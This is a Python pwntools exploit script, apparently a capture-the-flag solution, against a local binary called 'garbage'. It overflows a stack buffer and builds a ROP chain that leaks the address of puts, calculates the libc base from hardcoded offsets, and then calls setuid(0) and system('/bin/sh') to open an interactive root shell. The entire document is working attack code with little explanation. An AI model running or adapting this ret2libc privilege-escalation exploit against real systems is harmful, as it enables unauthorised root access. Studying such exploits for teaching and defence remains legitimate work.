#!/usr/bin/python3
from pwn import *

context(terminal=['tmux', 'new-window'])
p = process('./garbage')
#p = gdb.debug('./garbage', 'b main')
context(os='linux', arch='amd64')

junk = b'A' * 136

pop_rdi = p64(0x40179b) # ROPgadget / 0x000000000040179b : pop rdi ; ret
got_puts = p64(0x404028) # objdump -d garbage | grep main, puts/ 0000000000401050 <puts@plt>: / 401050:       ff 25 d2 2f 00 00       jmpq   *0x2fd2(%rip)        # 404028 <puts@GLIBC_2.2.5>
plt_puts = p64(0x401050)
plt_main = p64(0x401619)

# infoleak
infoleak = junk + pop_rdi + got_puts + plt_puts + plt_main
p.sendline(infoleak)

p.recvuntil("access denied.")

leaked_puts = p.recv()[:8].strip().ljust(8, b'\x00')
log.info(f'Leaked puts: {leaked_puts.hex()}')

# libc addresses
libc_puts = p64(0x73f30)  #   426: 0000000000073f30   429 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5
libc_system = p64(0x46ed0) #  1421: 0000000000046ed0    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
libc_binsh =  p64(0x183cee) #  183cee /bin/sh
libc_suid = p64(0xc8800)  # 25: 00000000000c8800   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5

# calculate libc base
libc_base = u64(leaked_puts) - u64(libc_puts)
log.info(f'libc base: {libc_base}')

# calculate locations
system_loc = (libc_base + u64(libc_system)).to_bytes(8, byteorder="little")
sh_loc = (libc_base + u64(libc_binsh)).to_bytes(8, byteorder="little")
suid_loc = (libc_base + u64(libc_suid)).to_bytes(8, byteorder="little")

log.info(f'system_loc: {system_loc.hex()}')
log.info(f'sh_loc: {sh_loc.hex()}')
log.info(f'suid_loc: {suid_loc.hex()}')

# build code exec payload
ce = junk + pop_rdi + p64(0) + suid_loc
ce += pop_rdi + sh_loc + system_loc

# send code exec payload
#p.recvuntil("access denied.")
p.sendline(ce)

# going interactive
p.interactive()
